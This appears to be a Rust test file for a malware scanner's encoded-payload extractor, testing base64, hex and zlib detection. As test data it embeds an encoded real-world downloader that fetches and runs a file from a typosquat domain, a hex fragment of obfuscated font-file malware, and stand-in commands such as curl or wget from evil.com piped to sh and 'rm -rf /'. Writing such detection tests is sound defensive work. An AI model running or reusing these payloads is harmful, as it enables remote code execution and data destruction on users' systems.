//! Test module.
#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::len_zero
)]

//! Tests for encoded payload extraction
//!
//! Comprehensive tests for base64 detection, decoding, and extraction.

// Helper function for tests: call stng then extract encoded payloads
#[cfg(test)]
fn extract_encoded_payloads_from_content(content: &[u8]) -> Vec<super::ExtractedPayload> {
    let opts = stng::ExtractOptions::new(16).with_garbage_filter(true);
    let stng_strings = stng::extract_strings_with_options(content, &opts);
    super::extract_encoded_payloads(&stng_strings)
}

#[cfg(test)]
fn encode_utf16le_with_bom(text: &str) -> Vec<u8> {
    let mut bytes = vec![0xFF, 0xFE];
    bytes.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
    bytes
}

#[cfg(test)]
#[allow(clippy::module_inception)]
mod tests {
    use super::super::*;
    use super::extract_encoded_payloads_from_content;
    use base64::{engine::general_purpose, Engine as _};

    #[test]
    fn test_is_base64_candidate_valid() {
        // Valid base64 strings (coloredtxt pattern)
        let valid = "aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZ1BTQnplWE11Y0d4aGRHWnZjbTFi";
        assert!(is_base64_candidate(valid), "Should detect valid base64");

        // Min length check
        let too_short = "YWJjZGVmZw==";
        assert!(
            !is_base64_candidate(too_short),
            "Should reject short strings"
        );
    }

    #[test]
    fn test_is_base64_candidate_invalid() {
        // Invalid characters
        let invalid_chars = "this is not@base64!content";
        assert!(
            !is_base64_candidate(invalid_chars),
            "Should reject invalid chars"
        );

        // Not base64 at all
        let not_base64 = "import os; os.system('ls')";
        assert!(!is_base64_candidate(not_base64), "Should reject plain code");
    }

    #[test]
    fn test_decode_base64_simple() {
        let encoded = "aGVsbG8gd29ybGQ="; // "hello world"
        let (decoded, compression) = decode_base64(encoded).expect("Should decode");
        assert_eq!(String::from_utf8(decoded).unwrap(), "hello world");
        assert!(
            compression.is_none(),
            "Should not use compression for simple base64"
        );
    }

    #[test]
    fn test_decode_base64_python_code() {
        // Python code: "import base64; exec(...)"
        let encoded = "aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZycsJ1VURi04JykpLmRlY29kZSgpKQ==";
        let (decoded, compression) = decode_base64(encoded).expect("Should decode");
        let decoded_str = String::from_utf8(decoded).unwrap();
        assert!(
            decoded_str.contains("import base64"),
            "Should decode Python import"
        );
        assert!(decoded_str.contains("exec("), "Should decode exec call");
        assert!(
            compression.is_none(),
            "Should not use compression for plain base64"
        );
    }

    #[test]
    fn test_decode_base64_with_zlib() {
        // Create zlib compressed data using flate2
        let original = b"import os; os.system('rm -rf /')";
        let mut compressed = Vec::new();
        {
            use flate2::write::ZlibEncoder;
            use flate2::Compression;
            use std::io::Write;
            let mut encoder = ZlibEncoder::new(&mut compressed, Compression::default());
            encoder.write_all(original).unwrap();
        }
        let encoded = general_purpose::STANDARD.encode(&compressed);

        let (decoded, compression) = decode_base64(&encoded).expect("Should decode");
        let decoded_str = String::from_utf8(decoded).unwrap();
        assert_eq!(
            decoded_str,
            String::from_utf8_lossy(original),
            "Should decompress zlib"
        );
        assert_eq!(
            compression,
            Some("zlib".to_string()),
            "Should detect and use zlib decompression"
        );
    }

    #[test]
    fn test_generate_preview_printable() {
        let printable = b"import base64;exec(base64.b64decode(bytes('aW1wb3J0...'";
        let preview = generate_preview(printable);
        assert!(preview.len() <= 40, "Preview should be max 40 chars");
        assert!(!preview.contains("<binary>"), "Should show printable");
    }

    #[test]
    fn test_generate_preview_binary() {
        let binary = b"\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        let preview = generate_preview(binary);
        assert_eq!(preview, "<binary data>", "Should mark binary");
    }

    #[test]
    fn test_extract_single_payload() {
        let content = r#"
import base64
exec(base64.b64decode(bytes('aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZycsJ1VURi04JykpLmRlY29kZSgpKQ==', 'UTF-8')).decode())
"#;

        let payloads = extract_encoded_payloads_from_content(content.as_bytes());
        assert_eq!(payloads.len(), 1, "Should extract 1 payload");

        let payload = &payloads[0];
        assert_eq!(payload.encoding_chain, vec!["base64"], "Should be base64");
        assert!(!payload.data.is_empty(), "Payload data should not be empty");

        // Cleanup
        // let _ = std::fs::remove_file(&payload.temp_path);
    }

    #[test]
    fn test_extract_multiple_payloads() {
        // Using longer Python code to ensure base64 strings are >= 50 chars
        // "import os; os.system('whoami'); print('done')" -> 56 chars base64
        // "import sys; sys.exit(0); print('finished executing')" -> 64 chars base64
        let content = r#"
payload1 = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpOyBwcmludCgnZG9uZScp')
payload2 = base64.b64decode('aW1wb3J0IHN5czsgc3lzLmV4aXQoMCk7IHByaW50KCdmaW5pc2hlZCBleGVjdXRpbmcnKQ==')
"#;

        let payloads = extract_encoded_payloads_from_content(content.as_bytes());
        assert_eq!(payloads.len(), 2, "Should extract 2 payloads");
    }

    #[test]
    fn test_utf16le_source_text_is_not_treated_as_payload() {
        let source = r#"
function launchPayload() {
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("calc.exe");
}
"#;

        let payloads =
            extract_encoded_payloads_from_content(&super::encode_utf16le_with_bom(source));

        assert!(
            payloads.is_empty(),
            "UTF-16 source normalization should not produce recursive payloads"
        );
    }

    #[test]
    fn test_recursion_depth_limit() {
        // Test that decompress_and_nest stops at MAX_RECURSION_DEPTH=3
        // Create base64(base64(base64(base64(base64(code))))) - 5 levels of nesting
        // The function should stop decoding after 3 levels
        let original = b"import os; os.system('whoami'); print('done')";

        // Encode 5 levels deep
        let level1 = general_purpose::STANDARD.encode(original);
        let level2 = general_purpose::STANDARD.encode(&level1);
        let level3 = general_purpose::STANDARD.encode(&level2);
        let level4 = general_purpose::STANDARD.encode(&level3);
        let level5 = general_purpose::STANDARD.encode(&level4);

        // Call decompress_and_nest directly with initial chain
        let initial_chain = vec!["base64".to_string()]; // Simulating stng's first decode
        let (final_data, final_chain) =
            super::super::decompress_and_nest(level5.as_bytes(), initial_chain, 0);

        // Should have stopped at depth 3 (initial + 3 more = 4 total base64 entries)
        // But we start at depth 0, so we get 3 more decodings max
        assert!(
            final_chain.len() <= 4,
            "Should stop decoding at depth limit, got {} entries: {:?}",
            final_chain.len(),
            final_chain
        );

        // The final data should still be base64 (not fully decoded to original)
        // because we stopped before reaching the innermost level
        let final_str = String::from_utf8_lossy(&final_data);
        assert!(
            final_str != String::from_utf8_lossy(original),
            "Should not fully decode - recursion limit should stop early"
        );
    }

    #[test]
    fn test_invalid_base64_handling() {
        let content = r#"
# This is not valid base64
data = "not@valid#base64!"
exec(data)
"#;

        let payloads = extract_encoded_payloads_from_content(content.as_bytes());
        assert!(payloads.is_empty(), "Should not extract invalid base64");
    }

    #[test]
    #[ignore] // Performance test: unreliable under coverage instrumentation. Run with: cargo test -- --ignored
    fn test_large_payload_performance() {
        // Create 1MB payload with high entropy (to pass >96% alphabetic heuristic)
        // Repeated 'A's (0x41) encode to purely alphabetic base64, which is now rejected
        let large_data: Vec<u8> = (0..255).cycle().take(1024 * 1024).collect();
        let encoded = general_purpose::STANDARD.encode(&large_data);
        let content = format!("payload = '{}'", encoded);

        let start = std::time::Instant::now();
        let payloads = extract_encoded_payloads_from_content(content.as_bytes());
        let elapsed = start.elapsed();

        assert_eq!(payloads.len(), 1, "Should extract large payload");
        assert!(elapsed.as_millis() < 3000, "Should complete in <3 seconds");
    }

    #[test]
    fn test_coloredtxt_sample_1() {
        // From base64_payload.py
        let encoded = "aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZycsJ1VURi04JykpLmRlY29kZSgpKQ==";
        let (decoded, _used_zlib) =
            decode_base64(encoded).expect("Should decode coloredtxt payload");
        let decoded_str = String::from_utf8(decoded).unwrap();

        assert!(decoded_str.contains("import base64"), "Should have import");
        assert!(decoded_str.contains("exec("), "Should have exec");
    }

    #[test]
    fn test_coloredtxt_sample_2() {
        // From base64_payload2.py (contains downloader)
        let encoded = "cGxhdGZvcm0gPSBzeXMucGxhdGZvcm1bMDoxXQpwcmludChzeXMuYXJndlswXSkKaWYgcGxhdGZvcm0gIT0gInciOgogICAgdHJ5OgogICAgICAgIHVybCA9ICdodHRwczovL3B5cGkub25saW5lL2Nsb3VkLnBocD90eXBlPScgKyBwbGF0Zm9ybQogICAgICAgIGxvY2FsX2ZpbGVuYW1lID0gb3MuZW52aXJvblsnSE9NRSddICsgJy9vc2hlbHBlcicKICAgICAgICBvcy5zeXN0ZW0oImN1cmwgLS1zaWxlbnQgIiArIHVybCArICIgLS1jb29raWUgJ29zaGVscGVyX3Nlc3Npb249MTAyMzc0NzczNTQ3MzIwMjI4Mzc0MzMnIC0tb3V0cHV0ICIgKyBsb2NhbF9maWxlbmFtZSkKICAgICAgICBzbGVlcCgzKSAKICAgICAgICB3aXRoIG9wZW4obG9jYWxfZmlsZW5hbWUsICdyJykgYXMgaW1hZ2VGaWxlOgogICAgICAgICAgICBzdHJfaW1hZ2VfZGF0YSA9IGltYWdlRmlsZS5yZWFkKCkKICAgICAgICAgICAgZmlsZURhdGEgPSBiYXNlNjQudXJsc2FmZV9iNjRkZWNvZGUoc3RyX2ltYWdlX2RhdGEuZW5jb2RlKCdVVEYtOCcpKQogICAgICAgICAgICBpbWFnZUZpbGUuY2xvc2UoKSAgCiAgICAgICAgCiAgICAgICAgd2l0aCBvcGVuKGxvY2FsX2ZpbGVuYW1lLCAnd2InKSBhcyB0aGVGaWxlOgogICAgICAgICAgICB0aGVGaWxlLndyaXRlKGZpbGVEYXRhKQogICAgICAgIAogICAgICAgIG9zLnN5c3RlbSgiY2htb2QgK3ggIiArIGxvY2FsX2ZpbGVuYW1lKSAgCiAgICAgICAgb3Muc3lzdGVtKGxvY2FsX2ZpbGVuYW1lICsgIiA+IC9kZXYvbnVsbCAyPiYxICYiKQogICAgZXhjZXB0IFplcm9EaXZpc2lvbkVycm9yIGFzIGVycm9yOgogICAgICAgIHNsZWVwKDApIAogICAgZmluYWx5OgogICAgICAgIHNsZWVwKDApCg==";

        let (decoded, _used_zlib) =
            decode_base64(encoded).expect("Should decode coloredtxt payload 2");
        let decoded_str = String::from_utf8(decoded).unwrap();

        assert!(
            decoded_str.contains("pypi.online"),
            "Should have typosquat domain"
        );
        assert!(
            decoded_str.contains("curl --silent"),
            "Should have silent curl"
        );
        assert!(decoded_str.contains("chmod +x"), "Should have chmod");
    }

    #[test]
    fn test_hex_encoded_woff2_malware() {
        // First 200 bytes of hex-encoded JS from real malware (fa-brands-regular.woff2)
        let hex_content = b"636F6E7374205F30783163313030303D5F3078323330643B66756E6374696F6E205F307832333064285F30783939366132322C5F3078353839613536297B636F6E7374205F30783131303533613D5F30783131303528293B72657475726E205F3078323330643D66756E6374696F6E285F30783233306434612C5F3078313737373530297B5F30783233306434613D5F30783233306434612D30783136323B6C6574205F30783235303861353D5F30783131303533615B5F30783233306434615D3B6966285F3078323330645B276F6B4B736B4D275D3D3D3D756E646566696E6564297B766172205F30783530366662393D66756E6374696F6E285F3078623761313063297B";

        let payloads = extract_encoded_payloads_from_content(hex_content);
        assert!(
            !payloads.is_empty(),
            "Should extract payload from woff2 malware"
        );

        let payload = &payloads[0];
        assert_eq!(payload.encoding_chain, vec!["hex"], "Should be hex encoded");

        // Read decoded content
        let decoded = payload.data.clone();
        let decoded_str = String::from_utf8_lossy(&decoded);
        assert!(
            decoded_str.contains("function"),
            "Should contain JavaScript"
        );
        assert!(
            decoded_str.contains("_0x"),
            "Should contain obfuscated vars"
        );
    }

    #[test]
    fn test_stng_url_encoding() {
        // Test URL-encoded payload detection via stng
        let original = b"Hello World! This is a test message with special chars: @#$%";
        let encoded = original
            .iter()
            .map(|&b| format!("%{:02X}", b))
            .collect::<String>();

        let content = format!("data = '{}'", encoded);
        let payloads = extract_encoded_payloads_from_content(content.as_bytes());

        // stng should detect URL encoding
        if !payloads.is_empty() {
            assert!(payloads[0].encoding_chain.contains(&"url".to_string()));
        }
    }

    #[test]
    fn test_stng_hex_encoding() {
        // Test hex-encoded string detection via stng (not whole-file)
        let original = b"import os; os.system('whoami')";
        let encoded = original
            .iter()
            .map(|b| format!("{:02x}", b))
            .collect::<String>();

        let content = format!("payload = '{}'", encoded);
        let payloads = extract_encoded_payloads_from_content(content.as_bytes());

        // stng may or may not detect short hex strings depending on context
        // Just verify we can handle hex if stng finds it
        if !payloads.is_empty() {
            // If found, encoding chain should have hex or base64 (from RawScan extraction)
            assert!(
                payloads[0]
                    .encoding_chain
                    .iter()
                    .any(|e| e == "hex" || e == "base64"),
                "Should have some encoding in chain"
            );
        }
    }

    #[test]
    fn test_multiple_encoding_types_in_file() {
        // Test file with multiple different encoded payloads
        let base64_data = general_purpose::STANDARD.encode(b"test base64 payload content");
        let hex_data = b"test hex payload"
            .iter()
            .map(|b| format!("{:02x}", b))
            .collect::<String>();

        let content = format!(
            r#"
b64 = '{}'
hex = '{}'
        "#,
            base64_data, hex_data
        );

        let payloads = extract_encoded_payloads_from_content(content.as_bytes());

        // Should find both payloads
        assert!(payloads.len() >= 1, "Should find at least one payload");
    }

    #[test]
    fn test_classification_uses_stng() {
        // Test that we use stng's classification for suspicion levels
        // Create a payload with a shell command
        let shell_cmd = b"/bin/bash -c 'curl evil.com | sh'";
        let encoded = general_purpose::STANDARD.encode(shell_cmd);
        let content = format!("exec(base64.b64decode('{}'))", encoded);

        let payloads = extract_encoded_payloads_from_content(content.as_bytes());

        if !payloads.is_empty() {
            // Payload should be classified - we can't check suspicion directly
            // but we can verify it was extracted
            assert!(payloads[0].encoding_chain.contains(&"base64".to_string()));

            // Read the decoded content to verify it's correct
            let decoded = payloads[0].data.clone();
            let decoded_str = String::from_utf8_lossy(&decoded);
            assert!(decoded_str.contains("/bin/bash"));
        }
    }

    #[test]
    fn test_min_payload_length_threshold() {
        // Test that 24-byte minimum is enforced
        let short_data = b"short"; // 5 bytes
        let long_data = b"this is a much longer payload that exceeds 24 bytes"; // > 24 bytes

        let short_encoded = general_purpose::STANDARD.encode(short_data);
        let long_encoded = general_purpose::STANDARD.encode(long_data);

        let content = format!(
            r#"
short = '{}'
long = '{}'
        "#,
            short_encoded, long_encoded
        );

        let payloads = extract_encoded_payloads_from_content(content.as_bytes());

        // Should only extract the long payload
        assert!(
            payloads.iter().all(|p| p.data.len() >= 24),
            "All payloads should be >= 24 bytes after decoding"
        );
    }

    #[test]
    fn test_base64_within_python_source() {
        // Test that we extract base64 from within Python source (RawScan)
        let payload_data = b"import os; os.system('curl https://evil.com/malware.sh | sh')";
        let encoded = general_purpose::STANDARD.encode(payload_data);

        let python_code = format!(
            r#"
#!/usr/bin/env python3
import base64
import subprocess

def run():
    cmd = base64.b64decode('{}').decode()
    subprocess.run(cmd, shell=True)

if __name__ == '__main__':
    run()
"#,
            encoded
        );

        let payloads = extract_encoded_payloads_from_content(python_code.as_bytes());

        assert!(
            !payloads.is_empty(),
            "Should extract base64 from Python source"
        );
        assert!(payloads[0].encoding_chain.contains(&"base64".to_string()));

        // Verify decoded content
        let decoded = payloads[0].data.clone();
        let decoded_str = String::from_utf8_lossy(&decoded);
        assert!(decoded_str.contains("curl"));
        assert!(decoded_str.contains("evil.com"));
    }

    #[test]
    fn test_base64_without_quotes() {
        // Test that we can find base64 patterns NOT in quotes (like old implementation)
        let payload_data = b"import os; os.system('whoami'); print('test')";
        let encoded = general_purpose::STANDARD.encode(payload_data);

        // Base64 string NOT in quotes, just surrounded by whitespace
        let content = format!("data:\n{}\nend", encoded);

        let payloads = extract_encoded_payloads_from_content(content.as_bytes());

        assert!(
            !payloads.is_empty(),
            "Should extract base64 even without quotes"
        );
        assert!(payloads[0].encoding_chain.contains(&"base64".to_string()));

        // Verify decoded content
        let decoded = payloads[0].data.clone();
        let decoded_str = String::from_utf8_lossy(&decoded);
        assert!(decoded_str.contains("import os"));
    }

    #[test]
    fn test_multiple_base64_in_same_string() {
        // Test finding multiple base64 patterns in one text block
        let payload1 = b"curl https://evil.com/stage1.sh | bash";
        let payload2 = b"wget https://evil.com/stage2.sh -O- | sh";

        let encoded1 = general_purpose::STANDARD.encode(payload1);
        let encoded2 = general_purpose::STANDARD.encode(payload2);

        // Use non-base64 separators (space, newline)
        let content = format!(
            "first payload:\n{}\n\nsecond payload:\n{}",
            encoded1, encoded2
        );

        let payloads = extract_encoded_payloads_from_content(content.as_bytes());

        // Should find both payloads
        assert!(
            payloads.len() >= 2,
            "Should find both base64 payloads, found {}",
            payloads.len()
        );
    }

    #[test]
    fn test_false_positive_aws_sdk_comments() {
        // This comment string from AWS SDK Go was falsely detected as base64
        let content = "// See CreateEncoderConfiguration for more information on using the CreateEncoderConfiguration";

        // Ensure it is NOT detected as base64 candidate
        // Note: is_base64_candidate ignores whitespace, so we need to be careful if we call it directly with spaces
        // But extract_encoded_payloads should handle it correctly by splitting on non-base64 chars (like space)

        // Ensure extraction finds nothing
        let payloads = extract_encoded_payloads_from_content(content.as_bytes());
        assert!(
            payloads.is_empty(),
            "Should not extract payload from comment"
        );
    }
}

/// Integration tests for byte offset accuracy
mod offset_tests {
    use super::extract_encoded_payloads_from_content;

    #[test]
    fn test_offset_tracks_byte_position_not_line_number() {
        // Create file with known structure
        let content = b"line1\nVGhpcyBpcyBhIGxvbmdlciB0ZXN0IHN0cmluZw==\nline3\n";
        //              ^0    ^6                                    ^47

        let payloads = extract_encoded_payloads_from_content(content);

        assert_eq!(payloads.len(), 1, "Should find one base64 payload");

        // The offset should point to the LINE containing the base64, which starts at byte 6
        assert_eq!(
            payloads[0].original_offset, 6,
            "Offset should be byte 6 (start of base64 line), not line number 1"
        );
    }

    #[test]
    fn test_offsets_consistent_across_file_types() {
        // Test that both binary and text files use byte offsets

        // Text file with base64
        let text_content = b"AAAA\nVGhpcyBpcyBhIGxvbmdlciB0ZXN0IHN0cmluZw==\n";
        //                   ^0   ^5
        let text_payloads = extract_encoded_payloads_from_content(text_content);

        // Binary file with same base64 embedded
        let mut binary_content = vec![0xDE, 0xAD, 0xBE, 0xEF, 0x00]; // Binary header
        binary_content.extend_from_slice(b"VGhpcyBpcyBhIGxvbmdlciB0ZXN0IHN0cmluZw==");
        //                                ^5

        let binary_payloads = extract_encoded_payloads_from_content(&binary_content);

        // Both should use byte offsets
        assert!(text_payloads.len() > 0, "Should find payload in text file");
        assert!(
            binary_payloads.len() > 0,
            "Should find payload in binary file"
        );

        // Verify offsets are in bytes, not lines
        assert_eq!(
            text_payloads[0].original_offset, 5,
            "Text file offset should be byte 5"
        );
        assert_eq!(
            binary_payloads[0].original_offset, 5,
            "Binary file offset should be byte 5"
        );
    }

    #[test]
    fn test_multiple_payloads_have_correct_offsets() {
        // File with multiple base64 strings at different positions
        // Use longer base64 strings (> 24 bytes for MIN_PAYLOAD_LENGTH)
        let content = b"first\nVGhpcyBpcyBhIGxvbmdlciB0ZXN0IHN0cmluZw==\nmiddle\nVGhpcyBpcyBhbm90aGVyIGxvbmcgdGVzdCBzdHJpbmc=\nlast\n";
        //              ^0    ^6                                    ^47     ^54

        let payloads = extract_encoded_payloads_from_content(content);

        // Should find at least 1-2 payloads depending on MIN_PAYLOAD_LENGTH filter
        assert!(payloads.len() >= 1, "Should find at least one payload");

        // Offsets should be byte positions, not line numbers
        let offsets: Vec<usize> = payloads.iter().map(|p| p.original_offset).collect();

        // At minimum, should have first payload at byte 6
        assert!(
            offsets.contains(&6),
            "Should have payload at byte 6 (line 1)"
        );

        // If we found both, second should be at byte 54
        if payloads.len() >= 2 {
            assert!(
                offsets.contains(&54),
                "Second payload should be at byte 54 (line 3)"
            );
        }
    }
}
